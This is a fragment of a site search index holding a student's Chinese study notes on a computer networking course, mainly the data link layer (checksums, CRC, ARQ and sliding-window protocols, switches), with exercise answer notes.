\u4f4d\u4fe1\u606f\uff0c1 \u4f4d\u5197\u4f59\uff0c\u52a0\u4e0a\u8fd9\u4e00\u4f4d\u4e4b\u540e 1 \u7684\u4e2a\u6570\u4e3a\u5947\u6570\uff0c\u79f0\u4e3a\u5947\u6821\u9a8c\u7801\uff1b\u5076\u6570\u5219\u4e3a\u5076\u6821\u9a8c\u7801</p> <p>\u5728\u5947\u5076\u6821\u9a8c\u7684\u57fa\u7840\u4e0a\uff0c\u6211\u4eec\u53ef\u4ee5\u5f15\u5165\u4ea4\u9519\u6821\u9a8c interleaving\uff0c\u8be5\u673a\u5236\u53ef\u4ee5\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u9632\u6b62\u7a81\u53d1\u7684\u82e5\u5e72bit\u7684\u9519\u8bef\uff0c\u5c06\u6570\u636e\u5757\u4f5c\u4e3a k \u884c n \u5217\u7684\u6570\u636e\uff0c\u6bcf\u5217\u8ba1\u7b97\u4e00\u4e2aparity bit\u7136\u540e\u53d1\u9001</p> <p>\u200b\u200b</p> <p>\u6821\u9a8c\u548c checksum</p> <p>\u5947\u5076\u6821\u9a8c\u4e5f\u53ef\u4ee5\u89c6\u4f5c\u6821\u9a8c\u548c\u7684\u4e00\u4e2a\u4f8b\u5b50\u3002\u5176\u5b9e\u5c31\u662f\u5bf9\u4fe1\u606f\u4f4d\u6570\u636e\u505a\u4e00\u4e9b\u6c42\u548c\u8fd0\u7b97</p> <p>\u6211\u4eec\u8fd9\u91cc\u518d\u4ecb\u7ecd\u4e00\u4e2a\u4f8b\u5b50 Internet Checksum\uff0c\u5148\u5c06\u6570\u636e\u621016-bit\u7684\u82e5\u5e72\u6bb5\uff0c\u6700\u540e\u4e00\u6bb5\u88650\u8865\u523016-bit\uff0c\u5c06\u8fd9\u4e9b\u6570\u636e\u6bb5\u76f8\u52a0\uff0c\u6700\u9ad8\u4f4d wrap around\uff0c\u6700\u540e\u5c06\u7ed3\u679c\u53d6\u53cd\u4f5c\u4e3a\u6821\u9a8c\u3002</p> <ul> <li>checksum\u7684\u7ed3\u679c\u4e0d\u9700\u8981\u53d6\u53cd\uff0c\u52a0\u5230frame\u91cc\u9762\u9700\u8981\u53d6\u53cd</li> </ul> <p>\u5728\u68c0\u67e5\u7684\u65f6\u5019\u518d\u6b21\u8ba1\u7b97\u6570\u636e\u4e4b\u548c\uff0c\u7136\u540e\u4e0e\u6821\u9a8c\u4f4d\u76f8\u52a0\uff0c\u7ed3\u679c\u7406\u5e94\u5168\u662f1</p> <p>\u200b\u200b</p> <p>\u5faa\u73af\u5197\u4f59\u7801 CRC Cylic Redundancy Code * \u9700\u8981\u4f8b\u9898\u5de9\u56fa</p> <p>\u53c8\u79f0\u4e3a\u591a\u9879\u5f0f\u7801 Polynomial code</p> <p>\u9996\u5148\u4e24\u8fb9\u8981\u7ea6\u5b9a\u4e00\u4e2a\u591a\u9879\u5f0f\uff0c\u53eb\u505a\u751f\u6210\u591a\u9879\u5f0f Generator polynomial\uff0c\u8fd9\u4e2a\u591a\u9879\u5f0f\u8981\u6ee1\u8db3\u6700\u9ad8\u4f4d\u548c\u6700\u4f4e\u4f4d\u7cfb\u6570\u90fd\u4e3a1</p> <p>\u7136\u540e\u770b\u770b\u5176\u6700\u9ad8\u4f4d\u662f\u591a\u5c11\uff0c\u6211\u4eec\u5c06\u8981\u4f20\u9012\u7684\u7801\u540e\u9762\u8865\u591a\u5c11\u4e2a0\uff0c\u7136\u540e\u6211\u4eec\u505a\u4e8c\u8fdb\u5236\u9664\u6cd5\uff08\u4e0d\u9700\u8981\u501f\u4f4d\uff0c0-1=1\uff09\uff0c\u6211\u4eec\u5c06\u9664\u6cd5\u83b7\u5f97\u7684\u4f59\u6570\u52a0\u4e0a\u539f\u6570\u636e\uff0c\u4f20\u9001\u8fc7\u53bb\uff0c\u5982\u679c\u505a\u4e86\u9664\u6cd5\u8fd8\u6709\u4f59\u6570\uff0c\u5c31\u8bf4\u660e\u9519\u4e86</p> <p>\u4f59\u6570\u4f4d\u6570\u548c\u6700\u9ad8\u4f4d\u4e00\u81f4</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/#3","title":"3. \u6d41\u91cf\u63a7\u5236\u548c\u4e00\u4e9b\u57fa\u672c\u534f\u8bae","text":""},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/#31","title":"3.1 \u5355\u5de5\u534f\u8bae","text":"<p>\u4e4c\u6258\u90a6\u5f0f\u5355\u5de5\u534f\u8bae Utopian Simplex Protocol</p> <p>\u53d1\u9001\u65b9\u4ece\u7f51\u7edc\u5c42\u83b7\u53d6\u6570\u636e\u5305\u5e76\u6784\u9020\u4e00\u4e2a\u5e27\uff0c\u7269\u7406\u5c42\u53d1\u9001\u5e27\uff1b\u63a5\u6536\u65b9\u552f\u4e00\u53ef\u80fd\u83b7\u53d6\u7684\u65f6\u95f4\u5c31\u662fFRAME_ARRIVAL</p> <p>\u4f46\u662f\u8fd9\u79cd\u65b9\u6848\u7684\u95ee\u9898\u5728\u4e8e\uff0c\u5982\u679c\u53d1\u9001\u65b9\u53d1\u9001\u5e27\u7684\u901f\u5ea6\u5927\u4e8e\u63a5\u6536\u65b9\u5904\u7406\u901f\u5ea6\uff0c\u63a5\u6536\u65b9\u5c31\u4f1a\u88ab\u6df9\u6ca1 flood</p> <p>\u65e0\u9519\u4fe1\u9053\u4e0a\u7684\u5355\u5de5\u505c-\u7b49\u534f\u8bae A Simplex Stop-and-Wait Protocol for a Error-Free Channel</p> <p>\u53d1\u9001\u65b9\u53d1\u9001\u5e27\uff0c\u63a5\u6536\u65b9\u63a5\u6536\u5230\u4e4b\u540e\uff0c\u8fd4\u56de\u4e00\u4e2aACK\uff0c\u63a5\u6536\u65b9\u63a5\u6536\u5230ACK\u4e4b\u540e\u624d\u53d1\u9001\u4e0b\u4e00\u5e27\uff0c\u53ef\u4ee5\u907f\u514d flood \u7684\u95ee\u9898</p> <ul> <li>\u6570\u636e\u4f20\u8f93\u662f\u5355\u5de5\uff0c\u4f46\u662f\u63a5\u6536\u65b9\u4f9d\u65e7\u8981\u53d1\u56de\u6d88\u606f\uff0c\u56e0\u6b64\u9700\u8981\u91c7\u7528\u534a\u53cc\u5de5\u4fe1\u9053</li> </ul> <p>\u4f46\u662f\u8fd9\u79cd\u65b9\u6848\u7684\u95ee\u9898\u5728\u4e8e\uff0c\u6ca1\u6709\u8003\u8651\u51fa\u9519\u7684\u60c5\u51b5\uff0c\u5982\u679c\u6709\u4e00\u4e2aACK\u4e22\u5931\u4e86\uff0c\u4f1a\u5bfc\u81f4\u53cc\u65b9\u9677\u5165\u65e0\u9650\u7684\u7b49\u5f85\u4e2d</p> <p>\u6709\u9519\u4fe1\u9053\u4e0a\u7684\u5355\u5de5\u505c-\u7b49\u534f\u8bae A Simplex Stop-and-Wait Protocol for a Noisy Channel</p> <p>\u5728\u4e0a\u4e00\u79cd\u534f\u8bae\u7684\u60c5\u51b5\u4e0b\uff0c\u8003\u8651\u4e09\u79cd\u53ef\u80fd\u7684\u9519\u8bef</p> <ul> <li> <p>\u63a5\u53d7\u5230\u7684\u5e27\u6709\u9519\u8bef</p> </li> <li> <p>\u6211\u4eec\u5f15\u5165\u4e00\u4e2a\u65b0\u7684\u65f6\u95f4CKSUM_ERR\u8868\u793a\u6821\u9a8c\u548c\u6709\u8bef\uff0c\u63a5\u6536\u65b9\u4f1a\u68c0\u67e5\u4e4b\u540e\u53d1\u9001\u6b63\u786e\u548c\u9519\u8bef\u7684\u786e\u8ba4</p> </li> <li>\u53d1\u9001\u65b9\u6536\u5230\u9519\u8bef\u7684\u786e\u8ba4\u4f1a\u5bfc\u81f4CKSUM_ERR\u7684\u53d1\u751f\uff0c\u9700\u8981\u91cd\u65b0\u53d1\u9001\u4e0a\u4e00\u5e27\uff0c\u56e0\u6b64\u53d1\u9001\u65b9\u9700\u8981\u6709\u4e00\u4e2a\u5b58\u50a8\u4e0a\u4e00\u5e27\u7684\u7f13\u5b58</li> <li> <p>\u53d1\u9001\u65b9\u53d1\u9001\u5e27\u4e22\u5931</p> </li> <li> <p>\u6211\u4eec\u5f15\u5165\u4e00\u4e2aTIME_OUT\u4e8b\u4ef6\uff0c\u5728\u53d1\u9001\u65b9\u53d1\u9001\u5e27\u4e4b\u540e\u7ef4\u62a4\u4e00\u4e2a\u8ba1\u6570\u5668\uff0c\u5982\u679c\u5728\u89c4\u5b9a\u65f6\u95f4\u5185\u672a\u63a5\u6536\u5230ACK\uff0c\u5219\u8fdb\u884c\u91cd\u53d1</p> </li> <li> <p>\u63a5\u6536\u65b9\u53d1\u9001ACK\u4e22\u5931</p> </li> <li> <p>\u4e0a\u8ff0\u7684\u505a\u6cd5\u53ea\u9002\u7528\u4e8e\u53d1\u9001\u5e27\u4e22\u5931\uff0c\u5982\u679c\u662fACK\u4e22\u5931\u7684\u8bdd\uff0c\u91cd\u53d1\u4f1a\u5bfc\u81f4\u63a5\u6536\u65b9\u63a5\u6536\u5230\u91cd\u590d\u4fe1\u606f</p> </li> <li>\u90a3\u4e48\u6211\u4eec\u9700\u8981\u5728\u6bcf\u4e00\u5e27\u90fd\u5f15\u5165\u4e00\u4e2a\u5947\u5076\u6821\u9a8c\u4f4d\uff08\u8fd9\u4e00\u4f4d\u6210\u4e3a\u5b57\u6bb5seq\uff09\uff0c\u90a3\u4e48\u63a5\u6536\u65b9\u5c31\u53ef\u4ee5\u5224\u65ad\uff0c\u8fd9\u662f\u91cd\u590d\u7684\u4e0b\u4e00\u5e27\uff0c\u8fd8\u662f\u8bf4\u6ca1\u6536\u5230ACK\u91cd\u53d1\u4e86</li> </ul> <p>\u4e0a\u8ff0\u8fd9\u79cd\u5728\u80af\u5b9a\u786e\u8ba4\u4e4b\u524d\u91cd\u4f20\u7684\u534f\u8bae\u53eb\u505a \u81ea\u52a8\u91cd\u590d\u8bf7\u6c42 ARQ\uff08Automatic Repeat ReQuest\uff09 \u6216\u8005\u53eb \u5e26\u91cd\u4f20\u7684\u80af\u5b9a\u786e\u8ba4 PAR \uff08Positive Acknowledgement with Retransmission\uff09</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/#32-piggybacking","title":"3.2 \u634e\u5e26\u786e\u8ba4 piggybacking *","text":"<p>\u4e0a\u8ff0\u7684\u5355\u5de5\u534f\u8bae\u4e2d\uff0c\u5982\u679c\u9700\u8981\u786e\u8ba4\u7684\u8bdd\u90fd\u9700\u8981\u534a\u53cc\u5de5\u4fe1\u9053\uff0c\u90a3\u4e48\u53cd\u5411\u7684\u4fe1\u9053\u5982\u679c\u53ea\u7528\u6765\u53d1\u786e\u8ba4\u663e\u5f97\u5f88\u4f4e\u6548\uff0c\u90a3\u4e48\u6211\u4eec\u91c7\u7528\u8fd9\u79cd\u8bbe\u8ba1\u3002</p> <p>\u5f53\u6bcf\u6b21\u6211\u9700\u8981\u53d1ACK\u7684\u65f6\u5019\uff0c\u6211\u4f1a\u7b49\u5f85\u4e00\u6bb5\u65f6\u95f4\uff0c\u5982\u679c\u8fd9\u6bb5\u65f6\u95f4\u91cc\uff0c\u6211\u6709\u7f51\u7edc\u5c42\u7684\u8bf7\u6c42\u8ba9\u6211\u7ed9\u53d1\u9001\u65b9\u53d1\u6d88\u606f\uff0c\u90a3\u4e48\u6211\u634e\u5e26\u5730\u53d1\u4e00\u4e2aACK\u8fdb\u53bb\uff1b\u5982\u679c\u6ca1\u6709\u7f51\u7edc\u5c42\u7684\u8bf7\u6c42\uff0c\u90a3\u4e48\u6211\u76f4\u63a5\u53d1\u9001\u4e00\u4e2a\u5355\u72ec\u7684ACK\u5305\u8fc7\u53bb</p> <p>\u770b\u4ee3\u7801</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/#33","title":"3.3 \u6ed1\u52a8\u7a97\u53e3\u534f\u8bae","text":"<p>\u5728\u4e0a\u8ff0\u4e00\u53d1\u9001\u4e00ACK\u7684\u534f\u8bae\u4e2d\uff0c\u5f80\u5f80\u5728\u7b49\u5f85\u4f20\u8f93\u5230\u8fbe\u548cACK\u5230\u8fbe\u7684\u8fc7\u7a0b\u4e2d\u5e26\u5bbd\u5f88\u4f4e\uff0c\u53d1\u9001\u4e00\u4e2a\u5e27\u7684\u65f6\u95f4\u663e\u7136\u6bd4\u5e27\u5230\u8fbe\u7684\u65f6\u95f4\u8981\u77ed\u5f88\u591a</p> <p>\u56e0\u6b64\u6211\u4eec\u5f15\u5165\u6ed1\u52a8\u7a97\u53e3\u534f\u8bae\uff0c\u4efb\u610f\u4e0a\u8bfe\u53d1\u9001\u65b9\u8981\u7ef4\u62a4\u4e00\u7ec4\u5141\u8bb8\u53d1\u9001\u7684\u5e27\u7684\u5e8f\u53f7\uff08seq\u5b57\u6bb5\uff0c\u4f46\u662f\u4e0d\u6b62\u4e00\u4e2abit\uff09\uff0c\u6210\u4e3a\u53d1\u9001\u7a97\u53e3 sending Window\uff1b\u63a5\u53d7\u65b9\u8981\u7ef4\u62a4\u4e00\u7ec4\u5141\u8bb8\u63a5\u53d7\u7684\u5e8f\u53f7\uff0c\u79f0\u4e3a \u63a5\u53d7\u7a97\u53e3 receiving Window</p> <p>\u8fd9\u4e24\u4e2a\u7a97\u53e3\u5927\u5c0f\u4e0d\u4e00\u5b9a\u76f8\u540c\uff0c\u4f46\u662f\u662f\u56fa\u5b9a\u7684</p> <p>\u4e0b\u9762\u4e24\u79cd\u534f\u8bae\u6210\u4e3a\u8fde\u7eedARQ\u534f\u8bae</p> <p>\u540e\u9000N\u5e27\u534f\u8baeGBN\uff08Go-Back-N\uff09</p> <p>\u8be5\u534f\u8bae\u7684\u6838\u5fc3\u5728\u4e8e\uff0c\u63a5\u53d7\u65b9\u91c7\u7528\u7d2f\u79ef\u786e\u8ba4\u4f20\u56de\u7684ACK\u4e3an\uff0c\u8bf4\u660e0-n\u7684\u5e27\u90fd\u5df2\u7ecf\u786e\u8ba4\u4e86\uff0c\u4ecen+1\u5f00\u59cb\u7684\u5e27\u6ca1\u786e\u8ba4\uff0c\u9700\u8981\u5168\u90e8\u91cd\u4f20</p> <p>\u6211\u4eec\u5047\u8bbe\u7528 n bit \u6765\u7ed9\u5e27\u7f16\u53f7\uff08\u4e5f\u5c31\u662f\u8bf4\u5e27\u7684\u5e8f\u53f7\u6700\u5927\u662f \\(2^n\\)\uff09</p> <ul> <li>\u53d1\u9001\u7a97\u53e3\u6ee1\u8db3 \\(1&lt;W_T\\leq 2^n -1\\)</li> <li>\u63a5\u53d7\u7a97\u53e3 \u4e3a 1</li> </ul> <p>\u5f53\u4fe1\u9053\u8bef\u7801\u7387\u8f83\u9ad8\u7684\u65f6\u5019\uff0c\u5176\u4e0d\u4e00\u5b9a\u4f18\u4e8e stop - wait \u534f\u8bae</p> <p>\u9009\u62e9\u91cd\u4f20\u534f\u8bae SR (selective repeat)</p> <p>\u8be5\u534f\u8bae\u7684\u6838\u5fc3\u5728\u4e8e\uff0c\u63a5\u6536\u65b9\u4e0d\u91c7\u7528\u7d2f\u79ef\u786e\u8ba4\uff0c\u5bf9\u4e8e\u6b63\u786e\u63a5\u53d7\u7684\u9010\u4e00\u786e\u8ba4\uff0c\u4e22\u5931\u7684\u4e0d\u53d1\u9001ACK\uff0c\u7b49\u5f85\u8d85\u65f6\u91cd\u4f20\uff1b\u51fa\u9519\u7684\u53d1\u9001NAK\uff0c\u8981\u6c42\u76f4\u63a5\u91cd\u4f20</p> <p>\u6211\u4eec\u5047\u8bbe\u7528 n bit \u6765\u7ed9\u5e27\u6807\u53f7</p> <ul> <li>\u6ee1\u8db3 \\(W_R+W_T\\leq 2^n\\)</li> <li>\u6ee1\u8db3 \\(W_R\\leq W_T\\)</li> </ul>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/#34","title":"3.4 \u4fe1\u9053\u5229\u7528\u7387\u5206\u6790","text":"<ul> <li>\\(T_D\\) \u662f\u53d1\u9001\u65f6\u5ef6\uff0c\u4e5f\u5c31\u662f\u5206\u7ec4\u7684\u957f\u5ea6 / \u6570\u636e\u4f20\u8f93\u901f\u7387</li> <li>\\(T_A\\) \u662f\u786e\u8ba4\u53d1\u9001\u65f6\u5ef6\uff0c\u4e5f\u5c31\u662f\u786e\u8ba4\u5206\u7ec4\u7684\u957f\u5ea6 / \u6570\u636e\u4f20\u8f93\u901f\u7387 \u5f80\u5f80\u53ef\u4ee5\u5ffd\u7565</li> <li>RTT \u5f80\u8fd4\u65f6\u5ef6</li> </ul> <p>stop-wait \u534f\u8bae</p> \\[ U =\\frac{T_D}{T_D+RTT+T_A} \\] <p>\u8fde\u7eedARP</p> \\[ U=\\frac{nT_D}{T_D+RTT+T_A} \\]"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/#4","title":"4. \u70b9\u5bf9\u70b9\u4f20\u8f93\u534f\u8bae\u5b9e\u4f8b*","text":"<ul> <li>LAN\u5c40\u57df\u7f51</li> <li>WAN\u5e7f\u57df\u7f51</li> </ul> <p>PPP\u534f\u8bae\u662f\u7528\u4e8e\u5e7f\u57df\u7f51\u4e2d\u7684\u70b9\u5bf9\u70b9\u63a7\u5236\u534f\u8bae</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/#5","title":"5. \u6570\u636e\u94fe\u8def\u5c42\u8bbe\u5907","text":"<p>\u6570\u636e\u94fe\u8def\u5c42\u7684\u8bbe\u5907\u5305\u62ec\u7f51\u6865\u548c\u4ea4\u6362\u673a</p> <p>\u5982\u679c\u6211\u4eec\u4f7f\u7528\u96c6\u7ebf\u5668\u6269\u5c55\u4ee5\u592a\u7f51\uff0c\u4f1a\u4f7f\u5f97\u51b2\u7a81\u57df\u65e0\u9650\u6269\u5927\uff0c\u7f51\u6865\u533a\u5206\u7f51\u6bb5\uff0c\u6bcf\u4e2a\u7f51\u6bb5\u90fd\u662f\u4e00\u4e2a\u4ee5\u592a\u7f51\uff0c\u53ef\u4ee5\u7ec4\u7ec7\u51b2\u7a81\u57df\u7684\u65e0\u9650\u6269\u5927</p> <p>\u200b\u200b</p> <p>\u4ee5\u592a\u7f51\u4ea4\u6362\u673a</p> <p>\u4ee5\u592a\u7f51\u4ea4\u6362\u673a\u53c8\u79f0\u4e8c\u5c42\u4ea4\u6362\u673a\uff0c\u5176\u5b9e\u5c31\u662f\u4e00\u4e2a\u591a\u63a5\u53e3\u7684\u7f51\u6865\uff0c\u5c06\u7f51\u7edc\u5206\u4e3a\u66f4\u5c0f\u7684\u51b2\u7a81\u57df</p> <p>\u5bf9\u4e8e\u7528\u6237\u800c\u8a00\uff0c\u5047\u8bbe\u4ee5\u592a\u7f51\u768410Mb/s \u6bcf\u4e2a\u7528\u6237\u7684\u603b\u8d37\u6b3e\u5c31\u53d8\u6210\u4e86 10 / N \u800c\u4ea4\u6362\u673a\u8fde\u63a5\u7684\u65f6\u5019\u6ca1\u6709\u8fd9\u79cd\u95ee\u9898\uff0c\u6bcf\u4e2a\u7528\u6237\u7684\u5e26\u5bbd\u8fd8\u662f10Mb/s</p> <p>\u200b\u200b</p> <p>\u4ea4\u6362\u673a\u5b58\u5728\u81ea\u5b66\u4e60\u7684\u80fd\u529b \u901a\u8fc7\u4ea4\u6362\u8868\u5b8c\u6210</p> <p>\u5171\u4eab\u5f0f\u4ee5\u592a\u7f51\u548c\u4ea4\u6362\u5f0f\u4ee5\u592a\u7f51</p> <ul> <li>\u5171\u4eab\u5f0f\u4ee5\u592a\u7f51\u4f7f\u7528\u96c6\u7ebf\u5668</li> <li>\u4ea4\u6362\u5f0f\u4ee5\u592a\u7f51\u4f7f\u7528\u4ea4\u6362\u673a</li> </ul> <p>\u5f53\u4e3b\u673a\u53d1\u666e\u901a\u5e27\u7684\u65f6\u5019\uff0cHub\u5c06\u5e27\u8f6c\u53d1\u5230\u6240\u6709\u63a5\u53e3\uff0c\u5404\u4e2a\u4e3b\u673a\u6839\u636e\u81ea\u8eab\u7684MAC\u5730\u5740\u548c\u5e27\u7684MAC\u5730\u5740\u53bb\u63a5\u53d7\u548c\u4e22\u5f03\uff1b\u800cSwitch\uff0c\u4ea4\u6362\u673a\u6536\u5230\u5e27\u4e4b\u540e\u4f1a\u628a\u5e27\u76f4\u63a5\u5355\u72ec\u53d1\u7ed9\u76ee\u7684\u4e3b\u673a\uff08\u5f53\u81ea\u5b66\u4e60\u5b8c\u6210\u7684\u65f6\u5019\uff09</p> <p>\u5f53\u4e3b\u673a\u53d1\u5e7f\u64ad\u5e27\u7684\u65f6\u5019\uff0c\u6548\u679c\u5176\u5b9e\u662f\u4e00\u6837\u7684\uff0c\u90fd\u5f80\u6240\u6709\u63a5\u53e3\u8f6c\u53d1</p> <p>\u591a\u5bf9\u4e3b\u673a\u540c\u65f6\u901a\u4fe1\uff0cHub\u4f1a\u51b2\u7a81\uff0cSwitch\u4e0d\u4f1a\u51b2\u7a81</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/#_2","title":"\u5e38\u89c1\u9898\u578b","text":"<ul> <li>\u5e27\u5b9a\u754c\u7684\u5404\u79cd\u65b9\u6cd5</li> <li>\u7ea0\u9519\u68c0\u9519\u7684\u5404\u79cd\u65b9\u6cd5</li> <li> <p>\u6d41\u91cf\u63a7\u5236\u4e0e\u6ed1\u52a8\u7a97\u53e3</p> </li> <li> <p>\u6ed1\u52a8\u7a97\u53e3\u7684\u5927\u9898</p> </li> </ul> <p>\u200b\u200b</p> <ul> <li>CRC\u68c0\u9519 10100001 / 1001 \u5e76\u4e14\u8981\u8865\u4e0a3\u4e2a0\uff0c\u56e0\u4e3a\u6700\u9ad8\u4f4d\u4e3a3\uff0c\u7b54\u6848\u662f\u4f59\u6570</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u6ed1\u52a8\u7a97\u53e3\u7684\u6548\u7387\u8ba1\u7b97\uff0c\u6ce8\u610f Propagation delay \u7684\u4e24\u500d\u624d\u7b49\u4e8eRTT</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u6548\u7387\u8ba1\u7b97\u7684\u53d8\u4f53\uff0c\u53d8\u6210\u4e86\u8ba1\u7b97\u541e\u5410\u91cf\uff0c\u541e\u5410\u91cf\u5c31\u662f\u53d1\u9001\u7684\u6570\u636e\u91cf / \u603b\u5f97\u6d88\u8017\u65f6\u95f4\uff0c\u6700\u7ec8\u4e0d\u4f1a\u8d85\u8fc764Kbps\uff0c\u5176\u5b9e\u5c31\u662f64Kbps*\u4fe1\u9053\u5229\u7528\u7387\uff0c\u5229\u7528\u7387\u4e0d\u8d85\u8fc7100%</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u4e24\u4e2a\u7a97\u53e3\u7684\u6982\u5ff5</li> </ul> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <ul> <li>CRC\u68c0\u9519\u7801\u5230\u5e95\u662f\u600e\u4e48\u7b97\u7684\uff08\u8981\u4fdd\u7559\u5230\u4e09\u4f4d\uff09</li> <li>QJS Quiz 3 \u7684\u5927\u9898 \u5728\u738b\u9053\u4e2d\u4e5f\u6709</li> </ul> <p>\u200b\u200b</p> <ul> <li> <p>PPP\u7684\u9898\u76ee\u8981\u53bb\u770b\u770b</p> </li> <li> <p>\u5728OSI\u4e2d \u94fe\u8def\u5c42\u6709 flow control \u4f46\u662fTCP\u7684\u94fe\u8def\u5c42\u6ca1\u6709</p> </li> </ul> <p>\u200b\u200b</p> <ul> <li>D \u8fd9\u662f\u7269\u7406\u5c42\u5e72\u7684 D</li> </ul> <p>hamming code</p> <ul> <li>\u68c0\u9519 d + 1</li> <li>\u7ea0\u9519 2d + 1</li> </ul> <p>\u200b\u200b</p> <ul> <li>B</li> </ul> <p>\u200b\u200b</p> <ul> <li>D \u4f59\u6570\u662f4\u4f4d \u53ea\u8981\u8ba1\u7b97\u524d\u4e94\u4f4d\uff0c\u7136\u540e\u770b\u770b\u4f59\u6570\u662f\u5426\u5339\u914d\u5373\u53ef</li> </ul> <p>\u200b\u200b</p> <ul> <li>B</li> </ul> <p>\u200b\u200b</p> <ul> <li>B B</li> </ul> <p>\u200b\u200b</p> <ul> <li>D \u65e0\u5e8f\u63a5\u53d7 \u5c31\u662f \u9009\u62e9\u91cd\u4f20</li> </ul> <p>\u200b\u200b</p> <ul> <li>C</li> </ul> <p>\u200b\u200b</p> <ul> <li>B \u8981\u57fa\u4e8e128\u5b57\u8282\u8ba1\u7b97</li> </ul> <p>\u200b\u200b</p> <ul> <li>B</li> </ul> <p>\u5927\u9898 P73</p> <p>\u200d</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E6%A6%82%E8%BF%B0/","title":"\u6982\u8ff0","text":"<ul> <li> <p>\u6ce8\u610fbyte\u548cbit\u7684\u8f6c\u6362</p> </li> <li> <p>bps\u4e3abit</p> </li> </ul>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E6%A6%82%E8%BF%B0/#_2","title":"\u4e60\u9898\u6536\u5f55","text":"<p>\u200b\u200b</p> <ul> <li>120 / 1000 * 100%</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u4f20\u64ad\u4e00\u4e2abit\u7684\u65f6\u95f4\u4e3a \\(1 / (10*10^6)=10^{-7}\\) \u4f20\u64ad\u901f\u5ea6\u4e3a \\(2/3*3*10^8=2*10^8\\)\uff0c\u4e24\u8005\u76f8\u4e58\u5373\u4e3a\u7b54\u6848</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u5ba2\u6237\u7aef\u5230\u536b\u661f\uff0c\u536b\u661f\u5230\u670d\u52a1\u7aef\uff0c\u670d\u52a1\u7aef\u5230\u536b\u661f\uff0c\u536b\u661f\u5230\u5ba2\u6237\u7aef</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u591a\u64ad\u7684\u6982\u5ff5</li> </ul> <p>\u200b\u200b</p> <ul> <li>5\u4e2a\u8def\u7531\u5668 10\u4e2a\u94fe\u63a5\uff0c\u6bcf\u4e2a\u94fe\u63a5\u67094\u79cd\u53ef\u80fd\uff0c\u6240\u4ee54^10*0.1s</li> </ul> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <p>\u200b\u200b</p> <ul> <li>\u8ba1\u7b97\u673a\u7f51\u7edc\u5728\u903b\u8f91\u4e0a\u53ef\u4ee5\u5206\u4e3a \u901a\u4fe1\u5b50\u7f51\u548c\u8d44\u6e90\u5b50\u7f51</li> <li> <p>\u7535\u8def\u4ea4\u6362 \u62a5\u6587\u4ea4\u6362 \u5206\u7ec4\u4ea4\u6362</p> </li> <li> <p>circuit switch</p> </li> <li>message switch \u5b58\u50a8\u8f6c\u53d1</li> <li>packet switch \u5b58\u50a8\u8f6c\u53d1 \u4f46\u662f\u8981\u5206\u7ec4</li> </ul> <p>\u200b\u200b</p> <ul> <li>980000B 1000 * 1000 B 10^6 B</li> <li>810^6 / (10010^6) = 80ms</li> <li>\u7b2c\u4e00\u4e2a\u5206\u7ec4\u8fd8\u8981\u5403\u4e0a \u4e24\u4e2a\u8def\u7531\u5668\u8f6c\u53d1\u7684\u65f6\u5ef6 0.08 * 2 = 0.16 ms \u672c\u9898\u4e2d\u6ca1\u6709\u4f20\u8f93\u65f6\u5ef6</li> <li>\u7b54\u6848\u662fC</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u7ed8\u56fe B</li> </ul> <p>\u200b\u200b</p> <ul> <li>C</li> </ul> <p>\u200b\u200b</p> <ul> <li>C \u5b9e\u9645\u6267\u884c\u662fTCPIP</li> </ul> <p>\u200b\u200b</p> <ul> <li>B</li> </ul> <p>\u200b\u200b</p> <ul> <li> <p>A</p> </li> <li> <p>\u8bed\u6cd5 \u662f\u6307 \u4fe1\u606f\u7684\u683c\u5f0f</p> </li> <li>\u8bed\u4e49 \u662f\u6307 \u53d1\u51fa\u4f55\u79cd\u63a7\u5236\u4fe1\u606f</li> <li>\u65f6\u5e8f \u6267\u884c\u5404\u9879\u64cd\u4f5c\u7684\u6761\u4ef6\u548c\u65f6\u5e8f\u5173\u7cfb</li> </ul> <p>\u200b\u200b</p> <ul> <li>D</li> </ul> <p>\u200b\u200b</p> <ul> <li>D A</li> </ul> <p>\u200b\u200b</p> <ul> <li>C</li> <li>\u4e92\u8054\u7f51\u91c7\u7528\u7684\u6838\u5fc3\u6280\u672f\u662fTCP/IP</li> </ul> <p>\u200b\u200b</p> <ul> <li>\u76f8\u90bb\u8282\u70b9 \u662fB</li> </ul> <p>\u200b\u200b</p> <ul> <li>BC \u4f20\u8f93 \u4f1a\u8bdd \u8868\u793a \u5e94\u7528</li> </ul> <p>\u200d</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E7%89%A9%E7%90%86%E5%B1%82/","title":"\u7269\u7406\u5c42","text":"<ul> <li>4B/5B \u90a3\u4e00\u5757\u5168\u90e8\u8981\u8bb0\u5fc6\u4e00\u904d</li> <li>baund rate \u548c bit rate\u7684\u533a\u522b</li> </ul> 